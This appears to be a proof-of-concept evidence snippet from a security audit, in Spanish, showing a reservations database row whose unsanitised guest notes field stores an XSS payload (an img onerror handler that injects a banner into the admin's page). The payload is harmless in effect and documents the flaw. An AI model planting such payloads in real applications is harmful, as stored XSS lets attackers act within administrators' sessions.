@@ -1,0 +1,9 @@
+############ OP-POC-3 — fila reservations con guest_notes CRUDO (fuente del XSS) ############
+# Consulta a la BD local (service client) de la reserva maliciosa RES-010:
+Fila reservations RES-010 (guest_notes almacenado CRUDO, sin sanear):
+{
+  "code": "RES-010",
+  "guest_name": "Huésped Malicioso (OP-POC-3)",
+  "guest_email": "attacker@evil.example",
+  "guest_notes": "<img src=x onerror=\"document.title='XSS-OP-POC-3';var d=document.createElement('div');d.id='pwned-op-poc-3';d.textContent='XSS-OP-POC-3 ejecutado en la sesion del admin';d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:99999;background:#c00;color:#fff;font:bold 24px sans-serif;padding:18px;text-align:center';document.body.appendChild(d)\">"
+}
